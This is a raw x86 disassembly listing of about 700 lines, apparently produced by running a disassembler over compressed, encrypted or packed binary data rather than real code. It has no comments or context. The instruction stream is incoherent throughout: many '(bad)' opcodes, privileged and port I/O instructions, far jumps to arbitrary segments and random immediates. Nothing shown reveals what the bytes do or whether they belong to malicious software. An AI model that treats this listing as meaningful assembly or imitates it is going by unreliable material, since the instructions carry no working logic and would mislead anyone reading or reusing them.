  4079a9:	xor    BYTE PTR [ecx+0x47304135],ch
  4079af:	push   ebx
  4079b0:	adc    al,0x5d
  4079b2:	cmp    BYTE PTR [ecx+0x67],0xe
  4079b6:	jne    0x4079f0
  4079b8:	xchg   esi,eax
  4079b9:	inc    esp
  4079ba:	int    0xfd
  4079bc:	pop    esi
  4079bd:	push   0xffffffe3
  4079bf:	lods   al,BYTE PTR ds:[esi]
  4079c0:	imul   edi,DWORD PTR [ecx+0x99035ce],0x484ea8ca
  4079ca:	shl    BYTE PTR [eax+0x7529a605],cl
  4079d0:	je     0x4079ce
  4079d2:	inc    bl
  4079d4:	mov    esi,0x7b84d96b
  4079d9:	out    dx,eax
  4079da:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4079db:	(bad)  
  4079dc:	sub    bh,BYTE PTR [eax]
  4079de:	cmc    
  4079df:	xchg   esi,eax
  4079e0:	rcl    BYTE PTR [ebp+0x64],cl
  4079e3:	cmp    al,0x25
  4079e5:	inc    esp
  4079e6:	(bad)  
  4079e8:	fs mov ah,ch
  4079eb:	dec    BYTE PTR [ecx-0x67a3c9d8]
  4079f1:	mov    eax,ds:0xbce71aec
  4079f6:	dec    ecx
  4079f7:	xor    al,0x23
  4079f9:	fsub   QWORD PTR [esi-0x1b505602]
  4079ff:	sub    al,0x55
  407a01:	and    al,BYTE PTR [ecx+0x2413558b]
  407a07:	(bad)  
  407a09:	leave  
  407a0a:	pop    ebx
  407a0b:	dec    edx
  407a0c:	mov    WORD PTR [edx-0x6c],?
  407a0f:	arpl   WORD PTR [ebp-0x6618b759],sp
  407a15:	fsubr  QWORD PTR [ebx-0x117d6a55]
  407a1b:	and    esi,DWORD PTR es:[ebp+0x6780a0b6]
  407a22:	pop    esi
  407a23:	cs daa 
  407a25:	std    
  407a26:	mov    esp,0xd59deabd
  407a2b:	push   eax
  407a2c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407a2d:	lods   al,BYTE PTR ds:[esi]
  407a2e:	mov    esi,0xff2475fb
  407a33:	outs   dx,DWORD PTR ds:[esi]
  407a34:	lds    ebp,FWORD PTR [ebp-0x2f]
  407a37:	push   edx
  407a38:	pop    ss
  407a39:	fst    DWORD PTR [eax]
  407a3b:	stos   BYTE PTR es:[edi],al
  407a3c:	les    eax,FWORD PTR [ecx-0x826fd61]
  407a42:	sbb    dh,BYTE PTR [ebx]
  407a44:	loope  0x407a6d
  407a46:	das    
  407a47:	jle    0x407a8b
  407a49:	(bad)  
  407a4a:	ins    BYTE PTR es:[edi],dx
  407a4b:	pop    ss
  407a4c:	sar    BYTE PTR [edi],0x1a
  407a4f:	std    
  407a50:	(bad)  
  407a51:	loopne 0x407a0f
  407a53:	rcr    BYTE PTR [ebx],1
  407a55:	outs   dx,DWORD PTR ds:[esi]
  407a56:	dec    esp
  407a57:	in     eax,0x8f
  407a59:	ret    
  407a5a:	int3   
  407a5b:	cmp    BYTE PTR [ebx+edx*4+0x400b8dad],cl
  407a62:	pop    esi
  407a63:	add    eax,0x725c2ba3
  407a68:	outs   dx,BYTE PTR ds:[esi]
  407a69:	nop
  407a6a:	push   DWORD PTR [esi]
  407a6c:	imul   ebx,DWORD PTR [eax+edi*8],0x5
  407a70:	ficomp DWORD PTR [esi+0x48]
  407a73:	inc    ebx
  407a74:	repnz cmp eax,0xa1b888a2
  407a7a:	pop    edx
  407a7b:	iret   
  407a7c:	in     al,dx
  407a7d:	ret    0xf828
  407a80:	mov    ebp,0x90e71d6b
  407a85:	stos   BYTE PTR es:[edi],al
  407a86:	mov    BYTE PTR [ebx+0x4a],al
  407a89:	pop    ebx
  407a8a:	repz popf 
  407a8c:	pop    edx
  407a8d:	xor    ah,BYTE PTR [esi]
  407a8f:	sbb    bl,BYTE PTR [edx]
  407a91:	setne  BYTE PTR [edi]
  407a94:	sbb    edi,DWORD PTR [ebx]
  407a96:	mov    eax,ds:0x985fce4f
  407a9b:	mov    bh,0xe
  407a9d:	ficomp DWORD PTR [eax]
  407a9f:	mov    ah,0x9d
  407aa1:	lods   al,BYTE PTR ds:[esi]
  407aa2:	cmp    BYTE PTR [ebx+edx*4],bl
  407aa5:	push   esp
  407aa6:	loop   0x407a2f
  407aa8:	out    dx,al
  407aa9:	adc    edx,ebp
  407aab:	lds    ecx,FWORD PTR [ebx-0x1e]
  407aae:	fisub  WORD PTR [ebx]
  407ab0:	test   al,0xd7
  407ab2:	popf   
  407ab3:	fwait
  407ab4:	xchg   ecx,eax
  407ab5:	mov    dh,0xf8
  407ab7:	icebp  
  407ab8:	jl     0x407a71
  407aba:	std    
  407abb:	mov    esp,0x68c7e203
  407ac0:	jmp    0x557d:0x1bbbfb36
  407ac7:	idiv   DWORD PTR [esi-0x44]
  407aca:	retf   
  407acb:	ins    BYTE PTR es:[edi],dx
  407acc:	inc    edi
  407acd:	pop    esp
  407ace:	sub    DWORD PTR [ebp-0x3e],ebp
  407ad1:	(bad)  
  407ad2:	sbb    BYTE PTR [ebp-0xc449e7c],dl
  407ad8:	sub    ebp,edi
  407ada:	add    eax,DWORD PTR ds:0xf47bb54d
  407ae0:	adc    al,0xa3
  407ae2:	shl    ecx,0xf7
  407ae5:	jmp    0x407b41
  407ae7:	and    cl,ch
  407ae9:	mul    BYTE PTR [esi+0x47b2fc92]
  407aef:	pop    ss
  407af0:	leave  
  407af1:	mov    al,ds:0x8ec3e06d
  407af6:	sti    
  407af7:	sti    
  407af8:	or     BYTE PTR [esi+esi*8],ah
  407afb:	retf   0x1c9
  407afe:	adc    BYTE PTR [ebx+ebp*1-0xf],dl
  407b02:	call   0xd93c6a4b
  407b07:	sub    eax,0xf47efbce
  407b0c:	jmp    0xcadc:0x812c6621
  407b13:	dec    edx
  407b14:	emms   
  407b16:	pop    edi
  407b17:	aaa    
  407b18:	out    0x33,eax
  407b1a:	and    dl,cl
  407b1c:	mov    ebp,0x875f655
  407b21:	jno    0x407b84
  407b23:	arpl   WORD PTR [ebx-0xb],dx
  407b26:	cmp    eax,esp
  407b28:	nop
  407b29:	nop
  407b2a:	push   edi
  407b2b:	in     eax,dx
  407b2c:	xor    ch,BYTE PTR [edx+0x2]
  407b2f:	mov    bl,0xa1
  407b31:	fwait
  407b32:	data16 aas 
  407b34:	loope  0x407b58
  407b36:	sbb    BYTE PTR [esi],cl
  407b38:	push   ds
  407b39:	pushw  0x61
  407b3c:	mov    al,ds:0xf570d689
  407b41:	push   edi
  407b42:	mov    eax,ds:0xd618190d
  407b47:	es dec ebp
  407b49:	sbb    eax,0x3e260b55
  407b4e:	lds    eax,FWORD PTR [ebx]
  407b50:	fwait
  407b51:	cmc    
  407b52:	(bad)  
  407b53:	pop    ds
  407b54:	or     eax,0x73f598aa
  407b59:	mov    edi,0x6501e2ba
  407b5e:	nop
  407b5f:	and    eax,0xb706a340
  407b64:	pusha  
  407b65:	scas   al,BYTE PTR es:[edi]
  407b66:	out    0xc1,eax
  407b68:	mov    ss,WORD PTR [eax-0x45]
  407b6b:	inc    esp
  407b6c:	adc    eax,0xa89fbf56
  407b71:	or     eax,0xa744cd23
  407b76:	in     al,dx
  407b77:	dec    eax
  407b78:	inc    esp
  407b79:	iret   
  407b7a:	inc    ebx
  407b7b:	aam    0x7e
  407b7d:	js     0x407b37
  407b7f:	and    DWORD PTR [edx+0x16],esi
  407b82:	add    al,0x4e
  407b84:	jmp    0x407b6d
  407b86:	in     al,0x2c
  407b88:	arpl   WORD PTR [edx],di
  407b8a:	add    dl,BYTE PTR [edi]
  407b8c:	inc    esi
  407b8d:	stc    
  407b8e:	sbb    ah,BYTE PTR [esi]
  407b90:	ret    
  407b91:	jbe    0x407ba0
  407b93:	mov    dh,dh
  407b95:	(bad)  
  407b97:	or     dl,bl
  407b99:	mov    DWORD PTR [edi-0xa],0x8b26a4c4
  407ba0:	adc    ah,al
  407ba2:	jg     0x407bc8
  407ba4:	pop    edi
  407ba5:	fwait
  407ba6:	pop    ss
  407ba7:	pop    ebp
  407ba8:	fistp  QWORD PTR [edi+0x57bdb7fc]
  407bae:	div    DWORD PTR [ebp+0x59bdae8]
  407bb4:	dec    ecx
  407bb5:	bound  ecx,QWORD PTR [edi]
  407bb7:	fwait
  407bb8:	sbb    eax,0x330f7945
  407bbd:	inc    esp
  407bbe:	pop    edi
  407bbf:	out    0x8,al
  407bc1:	push   cs
  407bc2:	call   FWORD PTR [edx*4+0x54a73bd8]
  407bc9:	retf   
  407bca:	fistp  DWORD PTR [ebx-0x2d3e4620]
  407bd0:	cmp    eax,0x38bfa7c4
  407bd5:	repz push es
  407bd7:	(bad)  
  407bd8:	fdiv   st(3),st
  407bda:	div    DWORD PTR [ecx-0x24e6179a]
  407be0:	inc    ecx
  407be1:	dec    eax
  407be2:	xchg   esp,eax
  407be3:	int    0x5a
  407be5:	(bad)  
  407be7:	(bad)  
  407be8:	rcr    BYTE PTR [ecx+0x54],0x96
  407bec:	test   eax,0x945185cf
  407bf1:	push   ds
  407bf2:	xor    edi,0xa6f45ccf
  407bf8:	inc    edx
  407bf9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  407bfa:	jno    0x407c0a
  407bfc:	sbb    DWORD PTR [ecx+0x7b],0x7f57499d
  407c03:	leave  
  407c04:	xchg   ecx,eax
  407c05:	(bad)  
  407c06:	xor    ecx,DWORD PTR [esi+esi*2]
  407c09:	das    
  407c0a:	test   ebp,eax
  407c0c:	mov    bh,0xa4
  407c0e:	mov    BYTE PTR [eax+0x1d],bh
  407c11:	(bad)  
  407c12:	xchg   esi,eax
  407c13:	mov    ds:0xe02ee52,eax
  407c18:	outs   dx,DWORD PTR ds:[esi]
  407c19:	cmp    bh,bh
  407c1b:	setl   BYTE PTR [ebp+edi*2-0x7dc5dadb]
  407c23:	add    al,al
  407c25:	into   
  407c26:	stos   DWORD PTR es:[edi],eax
  407c27:	mov    ch,0xde
  407c29:	pop    edx
  407c2a:	xchg   BYTE PTR [edi],dl
  407c2c:	repnz iret 
  407c2e:	bound  ebp,QWORD PTR [ebx]
  407c30:	inc    ebx
  407c31:	adc    BYTE PTR [esi],bl
  407c33:	inc    ebp
  407c34:	jno    0x407ca8
  407c36:	sbb    eax,0x3e7cc848
  407c3b:	inc    esp
  407c3c:	mov    esp,0xa0e477d8
  407c41:	stos   DWORD PTR es:[edi],eax
  407c42:	add    bh,ch
  407c44:	xchg   esp,eax
  407c45:	cdq    
  407c46:	jmp    0x407c1c
  407c48:	xchg   ecx,eax
  407c49:	pop    ecx
  407c4a:	xchg   DWORD PTR [ebx],eax
  407c4c:	in     al,dx
  407c4d:	loope  0x407cc7
  407c4f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c50:	imul   edx,DWORD PTR [esi+0x1a],0x6f
  407c54:	loop   0x407c36
  407c56:	xchg   esp,eax
  407c57:	lea    ebp,[ebx+0x756e54f9]
  407c5d:	sub    bl,dl
  407c5f:	jp     0x407cc4
  407c61:	and    cl,BYTE PTR [ebp-0x5a]
  407c64:	pop    esp
  407c65:	sub    al,0xbd
  407c67:	push   ss
  407c68:	dec    esp
  407c69:	ins    BYTE PTR es:[edi],dx
  407c6a:	pusha  
  407c6b:	jmp    0x6a91bb0c
  407c70:	ds pop ecx
  407c72:	mov    esp,DWORD PTR [edi]
  407c74:	retf   
  407c75:	mov    dh,0x75
  407c77:	jecxz  0x407c4b
  407c79:	out    dx,al
  407c7a:	into   
  407c7b:	ja     0x407c02
  407c7d:	adc    DWORD PTR [ebp-0x304d23f7],ecx
  407c83:	dec    edx
  407c84:	sub    dh,dl
  407c86:	(bad)  [esi]
  407c88:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407c89:	xchg   esp,eax
  407c8a:	fist   DWORD PTR [ebx+0x54a2b19e]
  407c90:	(bad)  
  407c91:	loop   0x407c5c
  407c93:	(bad)  [ebp-0x53f2ecb4]
  407c99:	ret    0x5297
  407c9c:	ss lahf 
  407c9e:	or     ebx,DWORD PTR ds:0x61066fb5
  407ca4:	mov    cl,0xeb
  407ca6:	leave  
  407ca7:	push   edx
  407ca8:	idiv   edi
  407caa:	iret   
  407cab:	adc    eax,0x4727f390
  407cb0:	fsin   
  407cb2:	mov    ebp,0xf80cfe7d
  407cb7:	push   esi
  407cb8:	push   esi
  407cb9:	int    0x82
  407cbb:	jle    0x407cda
  407cbd:	popa   
  407cbe:	stos   BYTE PTR es:[edi],al
  407cbf:	jmp    0x146:0x8b7c05f7
  407cc6:	pop    esi
  407cc7:	daa    
  407cc8:	std    
  407cc9:	enter  0x1792,0xaa
  407ccd:	adc    ebx,DWORD PTR [edx-0x7f]
  407cd0:	imul   ecx,DWORD PTR [ecx-0x7a],0x83069cae
  407cd7:	add    BYTE PTR [ecx],ch
  407cd9:	or     al,0x0
  407cdb:	mov    al,0xa4
  407cdd:	push   esp
  407cde:	mov    edx,0x832a14f7
  407ce3:	pop    ebp
  407ce4:	ja     0x407c7f
  407ce6:	xchg   edi,eax
  407ce7:	mov    al,ds:0x42dbfb14
  407cec:	and    eax,0x2ea757ab
  407cf1:	ror    DWORD PTR [eax],0x73
  407cf4:	jbe    0x407c8a
  407cf6:	ins    DWORD PTR es:[edi],dx
  407cf7:	js     0x407d3f
  407cf9:	into   
  407cfa:	adc    eax,0xe5e739e2
  407cff:	sti    
  407d00:	aaa    
  407d01:	fwait
  407d02:	pop    esp
  407d03:	xchg   esp,eax
  407d04:	cdq    
  407d05:	lock out dx,eax
  407d07:	mov    BYTE PTR [ecx-0x63],dl
  407d0a:	imul   ebx,DWORD PTR [eax+0x50],0x5084c8bb
  407d11:	xor    bh,BYTE PTR [edx]
  407d13:	sbb    bl,bh
  407d15:	jge    0x407d36
  407d17:	sbb    DWORD PTR ds:0xde201eee,edi
  407d1d:	xchg   ecx,eax
  407d1e:	lods   eax,DWORD PTR ds:[esi]
  407d1f:	jns    0x407d63
  407d21:	xchg   esp,eax
  407d22:	(bad)  
  407d23:	mov    ch,0xb6
  407d25:	fldpi  
  407d27:	cmp    eax,DWORD PTR [ecx+ebx*1-0x2f]
  407d2b:	cld    
  407d2c:	pop    ecx
  407d2d:	inc    ebp
  407d2e:	lahf   
  407d2f:	push   0x11
  407d31:	jecxz  0x407d6c
  407d33:	sub    ebx,DWORD PTR [eax+0x59]
  407d36:	mov    ch,dh
  407d38:	scas   eax,DWORD PTR es:[edi]
  407d39:	add    BYTE PTR [ecx+edx*8+0x4d],ah
  407d3d:	xor    DWORD PTR [edx],0x9bf75d3e
  407d43:	stos   DWORD PTR es:[edi],eax
  407d44:	pop    es
  407d45:	xor    DWORD PTR [esi+edx*2+0x78],ecx
  407d49:	jecxz  0x407ce7
  407d4b:	mov    ah,0x70
  407d4d:	adc    eax,0x52812d5f
  407d52:	pushf  
  407d53:	sti    
  407d54:	jmp    0x407d4b
  407d56:	mov    al,0xed
  407d58:	sar    BYTE PTR [eax+ebx*1],1
  407d5b:	js     0x407dca
  407d5d:	call   0x3709:0x5606e176
  407d64:	ud0    esi,DWORD PTR [eax-0x4d6400a4]
  407d6b:	stos   BYTE PTR es:[edi],al
  407d6c:	leave  
  407d6d:	test   eax,0x8a89a832
  407d72:	inc    ebp
  407d73:	movsx  edx,WORD PTR ds:0xb2e176d2
  407d7a:	lock movs BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d7c:	xchg   esp,eax
  407d7d:	jbe    0x407d9a
  407d7f:	lahf   
  407d80:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407d81:	retf   
  407d82:	js     0x407d78
  407d84:	push   ss
  407d85:	xchg   ebp,eax
  407d86:	shr    BYTE PTR [edx+0x74],cl
  407d89:	jmp    0xcec6:0x2b304f42
  407d90:	(bad)  
  407d91:	cmc    
  407d92:	in     al,0x91
  407d94:	(bad)  
  407d95:	int3   
  407d96:	jns    0x407d5d
  407d98:	je     0x407dc5
  407d9a:	lahf   
  407d9b:	js     0x407e14
  407d9d:	into   
  407d9e:	hlt    
  407d9f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407da0:	rcl    BYTE PTR [edi],0x4e
  407da3:	xchg   edx,eax
  407da4:	js     0x407d92
  407da6:	cmp    eax,0x1612b710
  407dab:	(bad)  
  407dac:	pop    edx
  407dad:	sub    eax,DWORD PTR [edi-0x7bf2cd54]
  407db3:	xchg   ecx,eax
  407db4:	xor    al,0x10
  407db6:	bound  edi,QWORD PTR [esp+eax*1]
  407db9:	nop
  407dba:	dec    edi
  407dbb:	inc    eax
  407dbc:	sbb    al,0x60
  407dbe:	ss leave 
  407dc0:	pop    ds
  407dc1:	clc    
  407dc2:	xchg   ecx,eax
  407dc3:	jno    0x407d61
  407dc5:	push   ebp
  407dc6:	cmp    BYTE PTR [edx],0xc6
  407dc9:	adc    ch,ah
  407dcb:	int    0x9a
  407dcd:	push   ds
  407dce:	repnz lahf 
  407dd0:	xor    al,0x6a
  407dd2:	fbstp  TBYTE PTR [esi-0x189a173]
  407dd8:	sbb    al,BYTE PTR [ecx+0x5]
  407ddb:	sub    al,BYTE PTR [edi+esi*2-0x6328e34a]
  407de2:	fnstsw WORD PTR [ebx+0x7ea3499]
  407de8:	ror    dh,cl
  407dea:	mov    dl,0xfd
  407dec:	pop    es
  407ded:	inc    esi
  407dee:	out    0x85,al
  407df0:	std    
  407df1:	push   eax
  407df2:	retf   
  407df3:	cmp    eax,0x5f49417a
  407df8:	call   0x35e36f53
  407dfd:	stc    
  407dfe:	inc    ebp
  407dff:	clts   
  407e01:	add    bh,BYTE PTR [ecx+esi*4+0xf529ed]
  407e08:	mov    ds:0x3694108d,al
  407e0d:	jo     0x407e6a
  407e0f:	push   esi
  407e10:	jbe    0x407db8
  407e12:	xor    ah,BYTE PTR [eax+edi*1]
  407e15:	sub    al,0x63
  407e17:	and    eax,0xe9ff34ac
  407e1c:	frstor [ecx-0x27e4ef20]
  407e22:	outs   dx,BYTE PTR ds:[esi]
  407e23:	mov    ds:0x41d593f7,eax
  407e28:	inc    esi
  407e29:	test   DWORD PTR [esi-0x36e6601a],eax
  407e2f:	push   esi
  407e30:	rcr    DWORD PTR [edx-0x2536f45a],1
  407e36:	test   DWORD PTR [ebx],eax
  407e38:	sbb    BYTE PTR [edi-0x16],dl
  407e3b:	mov    eax,ds:0xd9e78c0d
  407e40:	(bad)  
  407e41:	fiadd  DWORD PTR [ebx-0x5a]
  407e44:	xlat   BYTE PTR ds:[ebx]
  407e45:	pop    edi
  407e46:	mov    edx,DWORD PTR [edi+0x3a]
  407e49:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407e4a:	mov    cl,0xd2
  407e4c:	mov    al,ds:0x2c4fd4dd
  407e51:	shl    ch,cl
  407e53:	jmp    0x407e1c
  407e55:	push   ebp
  407e56:	cdq    
  407e57:	adc    eax,0x4a62befa
  407e5c:	dec    esi
  407e5d:	and    dl,BYTE PTR [edx-0x7e]
  407e60:	outs   dx,BYTE PTR ds:[esi]
  407e61:	lahf   
  407e62:	jbe    0x407ee2
  407e64:	add    cl,bh
  407e66:	enter  0xaf57,0x51
  407e6a:	cdq    
  407e6b:	pop    edi
  407e6c:	dec    BYTE PTR [esi-0x52dab301]
  407e72:	test   eax,0x7d9e790d
  407e77:	sbb    BYTE PTR [edx+0x14],bh
  407e7a:	adc    DWORD PTR [ecx+ebx*4+0x7f],0x83b36937
  407e82:	mov    dh,0x55
  407e84:	pusha  
  407e85:	or     eax,0x955bf3
  407e8a:	call   0xf6bc:0x7a650916
  407e91:	mov    esp,0x37acf3d1
  407e96:	push   0xc6d991a8
  407e9b:	jbe    0x407ed1
  407e9d:	dec    eax
  407e9e:	(bad)  
  407e9f:	ds js  0x407e4c
  407ea2:	test   DWORD PTR [edi-0x80],esi
  407ea5:	das    
  407ea6:	mov    al,0x89
  407ea8:	mov    bl,0x83
  407eaa:	imul   ebx,DWORD PTR [ebx+0x535e7af],0xffffffa9
  407eb1:	push   ebx
  407eb2:	(bad)  [ebx+ebx*8-0x7789fd21]
  407eb9:	int3   
  407eba:	cmp    eax,0x1437ed29
  407ebf:	jmp    0xb035:0x5bfb9d98
  407ec6:	sbb    ah,dl
  407ec8:	aad    0xac
  407eca:	sub    al,0x60
  407ecc:	adc    ecx,ebx
  407ece:	int3   
  407ecf:	pusha  
  407ed0:	and    dl,BYTE PTR ds:0xc41cafcd
  407ed6:	mov    esi,0xe5fb3def
  407edb:	loop   0x407ee8
  407edd:	pop    esp
  407ede:	inc    esp
  407edf:	bound  ebp,QWORD PTR [eax-0x5e]
  407ee2:	ret    
  407ee3:	je     0x407ebb
  407ee5:	jmp    0x28d5:0xe7567dad
  407eec:	jl     0x407e96
  407eee:	xor    ebx,DWORD PTR [ebx]
  407ef0:	mov    esp,0x48102893
  407ef5:	iret   
  407ef6:	or     eax,0x853bc9e3
  407efb:	dec    esi
  407efc:	sti    
  407efd:	fdivr  QWORD PTR [edi-0x7d]
  407f00:	add    BYTE PTR [edi+0x3f935d7d],bh
  407f06:	repz icebp 
  407f08:	fadd   DWORD PTR [ebx-0x4313413c]
  407f0e:	mov    DWORD PTR [ecx+0x37a31350],edi
  407f14:	and    eax,0x8534500e
  407f19:	inc    edx
  407f1a:	and    ebx,0xc97ea965
  407f20:	dec    esp
  407f21:	ret    0x5428
  407f24:	mov    DWORD PTR [edx-0x5c],esp
  407f27:	dec    ecx
  407f28:	push   esi
  407f29:	mov    esi,0x30fa059d
  407f2e:	and    esp,DWORD PTR [edi-0x1031fc9a]
  407f34:	mov    ah,0x88
  407f36:	ins    BYTE PTR es:[edi],dx
  407f37:	mov    BYTE PTR ds:0x27c902ad,ch
  407f3d:	fldcw  WORD PTR [edx]
  407f3f:	push   DWORD PTR [esp+ebx*1+0x179c0eaf]
  407f46:	cmp    esp,DWORD PTR [edx-0x12]
  407f49:	ret    0x4d69
  407f4c:	pop    ecx
  407f4d:	add    DWORD PTR [ebp+0x79],esi
  407f50:	pusha  
  407f51:	ja     0x407f30
  407f53:	fcomi  st,st(5)
  407f55:	pusha  
  407f56:	cmp    DWORD PTR [eax],esp
  407f58:	push   eax
  407f59:	int3   
  407f5a:	test   BYTE PTR [ecx],ah
  407f5c:	or     DWORD PTR [ebx+ecx*2-0x6480e7da],esp
  407f63:	adc    dh,BYTE PTR [ebx+0xe729cdf]
  407f69:	stos   DWORD PTR es:[edi],eax
  407f6a:	hlt    
  407f6b:	sub    edi,DWORD PTR [edx]
  407f6d:	shl    DWORD PTR ds:0x8623e415,1
  407f73:	fnstenv [esi-0x75]
  407f76:	fnsave [ebx+0x36]
  407f79:	es mov gs,WORD PTR ss:[eax+0x4b]
  407f7e:	dec    eax
  407f7f:	mov    ecx,0x1b1e76b4
  407f84:	not    DWORD PTR [ebx]
  407f86:	packsswb mm1,QWORD PTR [esi+ecx*1+0x3c9a608d]
  407f8e:	add    esi,0xffffffca
  407f91:	(bad)  
  407f92:	(bad)  
  407f93:	shr    BYTE PTR [ebx],0x2b
  407f96:	mov    bh,BYTE PTR [edx+0x5ea4f902]
  407f9c:	and    eax,0x548a0945
  407fa1:	adc    BYTE PTR [ecx+0x42],0xe1
  407fa5:	loopne 0x407faa
  407fa7:	xor    al,0x4e
  407fa9:	lods   al,BYTE PTR ds:[esi]
  407faa:	sub    al,0xac
  407fac:	add    DWORD PTR [ebx+edx*4+0x54],ebp
  407fb0:	fnstenv [ebx]
  407fb2:	out    0x54,al
  407fb4:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  407fb5:	cld    
  407fb6:	mov    dh,0x47
  407fb8:	adc    al,0x91
  407fba:	arpl   WORD PTR [ebx-0x2bc04964],bp
  407fc0:	sbb    dh,al
  407fc2:	call   0x3244ae7f
  407fc7:	popf   
  407fc8:	ds xchg ebx,eax
  407fca:	fs popf 
  407fcc:	cwde   
  407fcd:	cmp    DWORD PTR [edi],esi
  407fcf:	sbb    edx,eax
  407fd1:	xchg   dh,bl
  407fd3:	stos   BYTE PTR es:[edi],al
  407fd4:	out    dx,al
  407fd5:	loopne 0x408029
  407fd7:	adc    ecx,DWORD PTR ds:0xcc4852cb
  407fdd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  407fde:	outs   dx,BYTE PTR ds:[esi]
  407fdf:	push   edx
  407fe0:	shr    BYTE PTR ds:0xbfd04da9,cl
  407fe6:	stos   DWORD PTR es:[edi],eax
  407fe7:	cmp    eax,ecx
  407fe9:	cs (bad) 
  407feb:	sub    bh,bh
  407fed:	pop    ebx
  407fee:	addr16 mov al,0xfd
  407ff1:	je     0x408048
  407ff3:	je     0x40801d
  407ff5:	in     eax,0x57
  407ff7:	pop    esi
  407ff8:	jne    0x407fe4
  407ffa:	jb     0x408048
  407ffc:	mov    ebp,0xa6a2f207
  408001:	test   eax,0x44a20331
  408006:	push   eax
  408007:	retf   
  408008:	jno    0x40807d
  40800a:	retf   
  40800b:	inc    eax
  40800c:	push   es
  40800d:	pop    ebp
  40800e:	and    eax,0xaf7ae7ab
  408013:	dec    ebx
  408014:	mov    edx,0xc5bc16b0
  408019:	sbb    esp,0x7ad1bb3f
  40801f:	test   ebp,0x2dcba1f1
  408025:	add    edx,DWORD PTR [ecx+edi*8]
  408028:	cmp    BYTE PTR [ebx+0x2bc4a060],dl
  40802e:	rol    DWORD PTR [ebp+0x7c2863a5],1
  408034:	sub    DWORD PTR [ecx+ecx*4],eax
  408037:	push   esp
  408038:	cmp    ecx,0xffffffb7
  40803b:	(bad)  
  40803d:	add    BYTE PTR [esi+0x6cbc12ef],al
  408043:	pop    es
  408044:	pminsw mm7,QWORD PTR [esi+ebp*4-0x426f97ef]
  40804c:	test   BYTE PTR [esp+ebx*2],bl
  40804f:	push   ds
  408050:	ret    
  408051:	mov    ah,0x4c
  408053:	mov    al,0x3d
  408055:	mov    ds:0x2175f40e,al
  40805a:	push   eax
  40805b:	mov    eax,0xb2fe4680
  408060:	xchg   bl,bh
  408062:	rcl    BYTE PTR [esi-0x3a],1
  408065:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  408066:	jne    0x4080c1
  408068:	cdq    
  408069:	pop    ebx
  40806a:	mov    edi,0x3771d043
  40806f:	(bad)  
  408070:	loopne 0x408023
  408072:	in     al,0x79
  408074:	stos   BYTE PTR es:[edi],al
  408075:	lds    esi,FWORD PTR [esi+ebx*2+0x4d]
  408079:	or     ah,cl
  40807b:	in     eax,0xb7
  40807d:	jl     0x4080fb
  40807f:	in     al,0x69
  408081:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408082:	out    dx,al
  408083:	lahf   
  408084:	test   BYTE PTR [ebx+ebx*8],ch
  408087:	stos   BYTE PTR es:[edi],al
  408088:	and    ebx,DWORD PTR [edx]
  40808a:	loope  0x4080c5
  40808c:	dec    edi
  40808d:	mov    ah,bl
  40808f:	inc    esp
  408090:	pop    ebp
  408091:	adc    al,0x8e
  408093:	mov    eax,0xbc3b3b6d
  408098:	inc    edi
  408099:	add    DWORD PTR ss:[ecx],edi
  40809c:	imul   ebp,DWORD PTR [ebp-0x79],0xffffffb8
  4080a0:	out    0xae,eax
  4080a2:	(bad)  
  4080a3:	fdiv   DWORD PTR [edx]
  4080a5:	adc    BYTE PTR [edx+0x73398419],ch
  4080ab:	mov    cl,0x3a
  4080ad:	or     dl,al
  4080af:	inc    edi
  4080b0:	repz xor BYTE PTR [ebx+esi*2-0x47a4e7c],dl
  4080b8:	xchg   ecx,eax
  4080b9:	mov    ds:0x8988d3cd,al
  4080be:	nop
  4080bf:	jmp    0xd5a5:0x32c13a09
  4080c6:	xchg   ebx,eax
  4080c7:	and    dh,BYTE PTR ds:0x40c350a5
  4080cd:	sar    DWORD PTR [esi+0xd],0xf3
  4080d1:	fisub  DWORD PTR [esi]
  4080d3:	xchg   ebx,eax
  4080d4:	std    
  4080d5:	dec    eax
  4080d6:	mov    esp,0x41159d93
  4080db:	fld    QWORD PTR [eax+eax*4-0x37]
  4080df:	jae    0x4080c2
  4080e1:	adc    dl,BYTE PTR [esi+0x55d2fe98]
  4080e7:	addr16 (bad) 
  4080e9:	xchg   esi,eax
  4080ea:	ja     0x40814f
  4080ec:	test   BYTE PTR [edx],0x48
  4080ef:	loop   0x4080a9
  4080f1:	outs   dx,DWORD PTR ds:[esi]
  4080f2:	mov    ecx,0xb85ddca0
  4080f7:	ja     0x4080ae
  4080f9:	aam    0x1e
  4080fb:	jge    0x4080b8
  4080fd:	mov    bl,0x1a
  4080ff:	stc    
  408100:	dec    ebx
  408101:	mov    dh,0x71
  408103:	sub    DWORD PTR [esi],edx
  408105:	rcl    BYTE PTR [edx-0x8253ca0],cl
  40810b:	js     0x408099
  40810d:	sbb    bh,BYTE PTR [edx]
  40810f:	push   0xffffffba
  408111:	jl     0x408161
  408113:	jle    0x4080e2
  408115:	das    
  408116:	mov    esi,0xbd00832c
  40811b:	mov    ds:0x532a7c0e,eax
  408120:	sub    ah,dh
  408122:	dec    DWORD PTR ds:0xb4f116d5
  408128:	fidiv  WORD PTR [ebp+0x55]
  40812b:	outs   dx,BYTE PTR ds:[esi]
  40812c:	(bad)  
  40812d:	mov    al,ds:0x5ea9319d
  408132:	and    al,0xfa
  408134:	pushf  
  408135:	push   0xfffffff4
  408137:	add    ah,BYTE PTR [ecx]
  408139:	xchg   esp,eax
  40813a:	xlat   BYTE PTR ds:[ebx]
  40813b:	inc    eax
  40813c:	addr16 sub eax,0x75c3f686
  408142:	jmp    0x54b835f1
  408147:	mov    al,ds:0x8f47eb8e
  40814c:	sbb    eax,0xbf3ee3be
  408151:	add    al,0xb3
  408153:	adc    DWORD PTR [esi],ecx
  408155:	inc    edi
  408156:	test   edi,ebx
  408158:	repz sbb esi,edx
